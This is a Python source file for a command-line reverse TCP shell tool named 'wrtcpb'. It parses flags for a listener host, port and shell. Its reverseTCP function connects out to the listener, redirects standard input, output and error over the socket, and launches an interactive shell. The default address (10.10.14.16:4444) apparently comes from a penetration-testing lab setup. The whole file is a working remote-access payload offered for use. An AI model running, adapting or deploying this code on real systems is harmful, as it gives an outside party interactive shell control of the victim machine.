#!/usr/bin/python

# author: WatchDogOblivion
# description: TODO
# WatchDogs Reverse TCP Basic a.k.a wrtcpb

import os
import sys
import socket
import traceback
import subprocess


class WReverseTCPB:

  VERSION = "1.0"

  USAGE = "Usage: python wrtcpb.py -lh 10.10.14.16 -lp 4444 -c /bin/sh"

  class Flags:
    LH = "-lh"
    LOCAL_HOST = "--local-host"
    LP = "-lp"
    LOCAL_PORT = "--local-port"
    S = "-s"
    SHELL = "--shell"
    V = "-v"
    VERSION = "--version"
    H = "-h"
    HELP = "--help"

  def __init__(self, localHost="10.10.14.16", localPort=4444, shell="/bin/sh"):
    self.localHost = localHost  #type: str
    self.localPort = localPort  #type: int
    self.shell = shell  #type: str

  def displayHelp(self):
    FLAGS = WReverseTCPB.Flags
    LH_HELP = "Specify your local ip address. Default is: {}".format(self.localHost)
    LP_HELP = "Specify your local port. Default is: {}".format(self.localPort)
    S_HELP = "Specify the shell to launch on successful reverse tcp. Default is: {}".format(self.shell)
    V_HELP = "Show version"
    H_HELP = "Show this help message"

    print(WReverseTCPB.USAGE)
    print("Optional arguments:")
    print("  {}   {}     : {}".format(FLAGS.H, FLAGS.LOCAL_HOST, LH_HELP))
    print("  {}, {}     : {}".format(FLAGS.LP, FLAGS.LOCAL_PORT, LP_HELP))
    print("  {},  {}          : {}.".format(FLAGS.S, FLAGS.SHELL, S_HELP))
    print("  {},  {}        : {}.".format(FLAGS.V, FLAGS.VERSION, V_HELP))
    print("  {},  {}           : {}.".format(FLAGS.H, FLAGS.HELP, H_HELP))
    exit()

  def checkArgs(self):  #type: (WReverseTCPB) -> None
    FLAGS = WReverseTCPB.Flags
    sysArgs = sys.argv
    if (len(sysArgs) == 1):
      return

    if (sysArgs[1] == FLAGS.H or sysArgs[1] == FLAGS.HELP):
      self.displayHelp()

    if (sysArgs[1] == FLAGS.V or sysArgs[1] == FLAGS.VERSION):
      print("Reverse TCP version: {}".format(WReverseTCPB.VERSION))
      exit()

  def setArguments(self, flag, value):  #type: (WReverseTCPB, str, str) -> None
    FLAGS = WReverseTCPB.Flags

    if (flag not in FLAGS.__dict__.values()):
      raise ValueError("Unknown flag " + flag)

    if (flag == FLAGS.LH or flag == FLAGS.LOCAL_HOST):
      self.localHost = value
    elif (flag == FLAGS.LP or flag == FLAGS.LOCAL_PORT):
      self.localPort = int(value)
    elif (flag == FLAGS.S or flag == FLAGS.SHELL):
      self.shell = value

  def iterateArguments(self):  #type: (WReverseTCPB) -> None
    sysArgs = sys.argv
    sysArgsLength = len(sysArgs)
    if (sysArgsLength == 1):
      return
    for index in range(1, sysArgsLength):
      if (index % 2 == 0):
        continue
      self.setArguments(sysArgs[index], sysArgs[index + 1])

  def reverseTCP(self):  #type: (WReverseTCPB) -> None
    localHost = self.localHost
    localPort = self.localPort
    shell = self.shell
    print("Initiating connection: {}:{} {}".format(localHost, localPort, shell))

    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _socket.connect((localHost, localPort))
    os.dup2(_socket.fileno(), 0)
    os.dup2(_socket.fileno(), 1)
    os.dup2(_socket.fileno(), 2)
    subprocess.call([shell, "-i"])


def __main__():  #type: () -> None

  wrtcpb = WReverseTCPB()
  try:
    wrtcpb.checkArgs()
    wrtcpb.iterateArguments()
    wrtcpb.reverseTCP()
  except ValueError as ve:
    print(ve)
    print(WReverseTCPB.USAGE)
  except Exception:
    print(traceback.format_exc())
    print(WReverseTCPB.USAGE)


__main__()
